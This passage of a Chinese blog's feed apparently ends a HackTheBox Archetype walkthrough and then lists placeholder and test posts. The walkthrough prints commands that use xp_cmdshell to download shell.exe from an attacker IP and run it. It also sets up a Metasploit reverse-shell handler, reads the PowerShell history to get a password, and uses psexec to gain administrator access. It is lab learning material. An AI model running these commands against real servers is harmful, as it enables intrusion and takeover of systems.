class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.34:8000/shell.exe -outfile shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044252.webp" alt="下载shell.exe"></p><h3 id="4-msf监听并执行shell-exe"><a href="#4-msf监听并执行shell-exe" class="headerlink" title="4. msf监听并执行shell.exe"></a>4. msf监听并执行shell.exe</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.10.16.34</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;C:\Users\sql_svc\Downloads\shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044221.webp" alt="执行shell.exe"></p><h3 id="五、获取系统权限system"><a href="#五、获取系统权限system" class="headerlink" title="五、获取系统权限system"></a>五、获取系统权限system</h3><h3 id="1-查看powershell历史命令"><a href="#1-查看powershell历史命令" class="headerlink" title="1. 查看powershell历史命令"></a>1. 查看powershell历史命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044204.webp" alt="powershell历史命令"></p><h3 id="2-利用psexec进行登陆连接"><a href="#2-利用psexec进行登陆连接" class="headerlink" title="2. 利用psexec进行登陆连接"></a>2. 利用psexec进行登陆连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044184.webp" alt="psexec登陆"></p><details><summary>💡 关于 PsExec（点击展开）</summary>PsExec 是一种轻型 telnet-replacement，可用于在其他系统上执行进程，无需手动安装客户端软件即可完成控制台应用程序的完整交互性。  PsExec 最强大的用途包括在远程系统和远程启用工具（如 IpConfig）上启动交互式命令提示符。  psexec 的使用不需要对方主机开启 3389 端口，只需要对方开启 admin 共享或 c 盘共享（默认开启，依赖于 445 端口）。  但是，假如目标主机开启了防火墙（默认禁止 445 端口连接），psexec 也是不能使用的，会提示找不到网络路径。  由于 psexec 是 Windows 提供的工具，所以杀毒软件会将其添加到白名单中。  </details><p>完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次 HTB Archetype 靶场主要学习了：</p><ul><li>SMB 匿名访问与敏感文件泄露</li><li>MSSQL 连接与 xp_cmdshell 命令执行</li><li>利用 MSF 生成木马并反弹 shell</li><li>Windows 提权思路（历史命令获取明文密码 + psexec）</li></ul><p>此外在使用靶场环境时候，为了防止靶场文件不知道放在那里，最好在powershell开始之前先切换靶场目录。</p><p>在执行反弹shell的时候一定要小心lhost和lport不要写错。</p><p>在本次测试中，也遇到了一些没遇到过的问题，比如：</p><ul><li>MSSQL 连接时的路径问题（<code>/</code> 和 <code>\</code> 的区别）</li><li>Powershell 历史命令的存储位置</li></ul><p>以上是本次测试的总结，再接再厉！</p>]]></content>
    
    
    <summary type="html">HackTheBox:Archetype 靶场的完整渗透流程，包括信息收集、SMB 枚举、MSSQL 利用、xp_cmdshell 命令执行、反弹 Meterpreter、psexec 进行登陆连接等步骤。</summary>
    
    
    
    <category term="htb" scheme="https://isnuyoah.github.io/categories/htb/"/>
    
    
    <category term="HTB" scheme="https://isnuyoah.github.io/tags/HTB/"/>
    
    <category term="靶场渗透测试" scheme="https://isnuyoah.github.io/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="Windows" scheme="https://isnuyoah.github.io/tags/Windows/"/>
    
    <category term="MSSQL" scheme="https://isnuyoah.github.io/tags/MSSQL/"/>
    
    <category term="SMB" scheme="https://isnuyoah.github.io/tags/SMB/"/>
    
  </entry>
  
  <entry>
    <title>靶场文章标题</title>
    <link href="https://isnuyoah.github.io/posts/8283a223.html"/>
    <id>https://isnuyoah.github.io/posts/8283a223.html</id>
    <published>2025-07-31T02:00:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<p>文章正文内容…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章正文内容…&lt;/p&gt;
</summary>
      
    
    
    
    <category term="htb" scheme="https://isnuyoah.github.io/categories/htb/"/>
    
    
    <category term="靶场" scheme="https://isnuyoah.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="漏洞利用" scheme="https://isnuyoah.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>靶场文章标题</title>
    <link href="https://isnuyoah.github.io/posts/8283a223.html"/>
    <id>https://isnuyoah.github.io/posts/8283a223.html</id>
    <published>2025-07-31T02:00:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<p>文章正文内容…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章正文内容…&lt;/p&gt;
</summary>
      
    
    
    
    <category term="tryhackme" scheme="https://isnuyoah.github.io/categories/tryhackme/"/>
    
    
    <category term="靶场" scheme="https://isnuyoah.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="漏洞利用" scheme="https://isnuyoah.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>封面图测试文章</title>
    <link href="https://isnuyoah.github.io/posts/4aaaaa72.html"/>
    <id>https://isnuyoah.github.io/posts/4aaaaa72.html</id>
    <published>2025-07-09T07:30:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇用于测试博客封面图的文章。</p><p>封面图片来自：<code>https://api.mtyqx.cn/api/random.php</code>，每次访问会随机显示一张二次元图片，非常适合用于动漫类博客的装饰或测试展示用途。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是一篇用于测试博客封面图的文章。&lt;/p&gt;
&lt;p&gt;封面图片来自：&lt;code&gt;https://api.mtyqx.cn/api/random.php&lt;/code&gt;，每次访问会随机显示一张二次元图片，非常适合用于动漫类博客的装饰或测试展示用途。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="测试" scheme="https://isnuyoah.github.io/categories/%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="test" scheme="https://isnuyoah.github.io/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>测试自动化部署</title>
    <link href="https://isnuyoah.github.io/posts/3cbf5c9a.html"/>
    <id>https://isnuyoah.github.io/posts/3cbf5c9a.html</id>
    <published>2025-05-28T02:00:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试自动化部署"><a href="#测试自动化部署" class="headerlink" title="测试自动化部署"></a>测试自动化部署</h1><p>这是一篇用于测试 Hexo 博客自动化部署的简单文章。</p><p>通过这篇文章，我们确认：</p><ul><li>博客能成功生成</li><li>自动化部署流程正常执行</li><li>页面能正确显示内容</li></ul><p>谢谢阅读！祝你部署顺利！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;测试自动化部署&quot;&gt;&lt;a href=&quot;#测试自动化部署&quot; class=&quot;headerlink&quot; title=&quot;测试自动化部署&quot;&gt;&lt;/a&gt;测试自动化部署&lt;/h1&gt;&lt;p&gt;这是一篇用于测试 Hexo 博客自动化部署的简单文章。&lt;/p&gt;
&lt;p&gt;通过这篇文章，我们确认：&lt;/p</summary>
      
    
    
    
    <category term="测试" scheme="https://isnuyoah.github.io/categories/%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="测试" scheme="https://isnuyoah.github.io/tags/%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化部署" scheme="https://isnuyoah.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
</feed>
